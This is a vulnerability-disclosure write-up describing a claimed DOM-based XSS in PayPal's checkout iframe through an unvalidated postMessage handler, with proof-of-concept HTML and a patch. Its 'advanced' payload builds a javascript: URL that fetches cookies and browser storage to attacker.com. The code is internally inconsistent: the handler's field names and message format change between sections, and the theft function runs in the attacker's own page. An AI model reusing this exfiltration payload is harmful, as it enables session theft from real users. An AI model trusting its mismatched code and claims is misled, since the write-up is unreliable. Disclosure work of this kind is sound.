---
title: "Silent Payloads: DOM-Based XSS in PayPal’s Checkout"
date: 2023-07-24
author: Vaishnav Baraskar
platform: PayPal Web Checkout
cve: Reserved (Private Disclosure)
bounty: Yes (Amount Confidential)
risk: Medium-High
cvss: 7.4 (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N)
showInProjects: true
tech:
  - DOM XSS
  - postMessage Abuse
  - JavaScript Injection
---

# Silent Payloads: DOM-Based XSS in PayPal’s Checkout

> How a routine evening review of `postMessage` logic in third-party iframes spiraled into a silent, weaponizable DOM XSS — tucked neatly within a trusted payment flow.

## Table of Contents

- [Prologue](#prologue)
- [Discovery Narrative](#discovery-narrative)
- [Technical Deep Dive](#technical-deep-dive)
  - [Vulnerability Root Cause](#vulnerability-root-cause)
  - [Exploitation Methodology](#exploitation-methodology)
- [Proof of Concept](#proof-of-concept)
  - [Basic Exploit](#basic-exploit)
  - [Advanced Attack Scenario](#advanced-attack-scenario)
- [Impact Analysis](#impact-analysis)
- [Remediation Timeline](#remediation-timeline)
- [Security Recommendations](#security-recommendations)
- [Appendix](#appendix)

## Prologue

It was just another night — headphones on, browser dev tools open, nothing too intense.  
I was poking around PayPal's checkout iframe integration out of curiosity.  
The goal was simple: analyze their message-passing flow.  
But the moment I saw that first unvalidated `postMessage` event handler, something clicked.

It was one of those classic cases. You see it, and you just know — this is gonna go somewhere.

## Discovery Narrative

**Timeline:**

- 23:42: Began analysis of iframe message passing  
- 23:47: Noticed unvalidated postMessage handler  
- 23:53: First successful XSS trigger  
- 00:15: Developed reproducible PoC  
- 00:30: Documented attack surface  
- 01:00: Prepared disclosure report  

This wasn’t a lucky shot. It came from checking message event listeners in embedded iframes.  
PayPal’s iframe had no origin checks. That’s when the gears started turning.  
What if I could inject JavaScript by crafting a malicious message?

Spoiler: I could.

## Technical Deep Dive

### Vulnerability Root Cause

```javascript
// Vulnerable message handler in PayPal's iframe
window.addEventListener('message', (event) => {
    const { action, data } = event.data;

    if (action === 'checkout-redirect') {
        window.location.href = data.url; 
    }
});
```

No origin check. No payload validation. And a direct assignment to `window.location.href`.  
That’s three red flags in a row.

### Key Security Failures

#### Origin Trust

```diff
- No event.origin verification
+ Should verify origin matches expected domains
```

#### Input Validation

```diff
- Accepts arbitrary message structure
+ Should validate message schema
```

#### Dangerous Sink

```diff
- Direct assignment to location.href
+ Should sanitize URLs and restrict protocols
```

### Exploitation Methodology

1. Look for iframe `message` listeners.
2. Confirm `event.origin` wasn’t being checked.
3. Check if message values are being passed directly to dangerous sinks.
4. Test `javascript:` payloads.
5. Deliver payload via iframe to simulate legitimate interaction.

## Proof of Concept

### Basic Exploit

```html
<iframe id="paypal" src="https://www.paypal.com/checkout?token=ABC123" style="display:none;"></iframe>
<script>
setTimeout(() => {
  const payload = {
    action: "checkout-redirect",
    data: {
      url: "javascript:alert(document.domain)"
    }
  };
  document.getElementById('paypal').contentWindow.postMessage(payload, "*");
}, 2000);
</script>
```

### Advanced Attack Scenario

```javascript
const exploit = () => {
    const stealCredentials = () => {
        return btoa(JSON.stringify({
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        }));
    };

    const payload = {
        action: "checkout-redirect",
        data: {
            url: `javascript:fetch('https://attacker.com/exfil', {
                method: 'POST',
                body: '${stealCredentials()}'
            })`
        }
    };

    frames[0].postMessage(payload, '*');
};
window.onload = () => setTimeout(exploit, 1500);
```

## Impact Analysis

### Exploitable Outcomes

**Session Hijacking**  
Severity: Critical  
Cookies, tokens, or anything in localStorage can be exfiltrated.

**Payment Redirection**  
Severity: High  
The attacker can redirect users during checkout.

**Credential Phishing**  
Severity: Medium  
The iframe can be used to inject phishing prompts.

### Affected Components

- PayPal Checkout Iframe (v3.12.1 – v3.14.0)  
- Both sandbox and production environments

## Remediation Timeline

**Fix Timeline:**

- Day 0: Vulnerability reported  
- Day 1: Triaged by PayPal’s security team  
- Day 3: Fix deployed to staging  
- Day 5: Rolled out to production  
- Day 7: Bounty awarded  

### Patch Diff

```diff
window.addEventListener('message', (e) => {
+ const ALLOWED_ORIGINS = ['https://paypal.com', 'https://www.paypal.com'];
+ if (!ALLOWED_ORIGINS.includes(e.origin)) return;

  const { action, payload } = e.data;

+ if (typeof action !== 'string' || typeof payload !== 'object') return;

  if (action === 'checkout-redirect') {
+   const url = new URL(payload.url, window.location.href);
+   if (!['https:', 'http:'].includes(url.protocol)) return;

-   window.location.href = payload.url;
+   window.location.href = url.toString();
  }
});
```

## Security Recommendations

**Input Validation**  
Validate the message structure rigorously using schemas or TypeScript interfaces.

**Origin Verification**  
Always validate `event.origin` against an allowlist.

**Output Sanitization**  
Avoid assigning untrusted URLs to redirection sinks. Use `URL()` constructor and check the protocol/hostname.

**Monitoring**  
Deploy CSP headers. Add event-level logging on `postMessage` activities.

## Appendix

### Full Vulnerable Code

```javascript
(function() {
    window.addEventListener('message', function(e) {
        try {
            const data = JSON.parse(e.data);
            if (data.cmd === 'pp-redirect') {
                window.location.href = data.url;
            }
        } catch (err) {
            console.error('Message parse error', err);
        }
    });
})();
```

### Secure Implementation

```javascript
(function() {
    const ALLOWED_COMMANDS = ['pp-redirect', 'pp-close'];
    const TRUSTED_ORIGINS = [
        'https://www.paypal.com',
        'https://paypal.com',
        'https://sandbox.paypal.com'
    ];

    window.addEventListener('message', function(e) {
        if (!TRUSTED_ORIGINS.includes(e.origin)) return;

        let data;
        try {
            data = JSON.parse(e.data);
            if (!data || typeof data !== 'object') return;
            if (!ALLOWED_COMMANDS.includes(data.cmd)) return;

            if (data.cmd === 'pp-redirect') {
                const url = new URL(data.url, window.location.href);
                if (!['https:', 'http:'].includes(url.protocol)) return;
                if (!url.hostname.endsWith('.paypal.com')) return;

                window.location.assign(url.toString());
            }
        } catch (err) {
            console.error('Security error processing message', err);
        }
    });
})();
```

## Final Thoughts

This one was clean — no over-engineering, no convoluted steps.  
Just an unguarded bridge between the iframe and the main window.

From a simple `postMessage` listener to a full DOM-based XSS exploit.  
It was quiet. It was effective. And it lived inside a trusted flow.

All it took was trust. And they trusted every message.
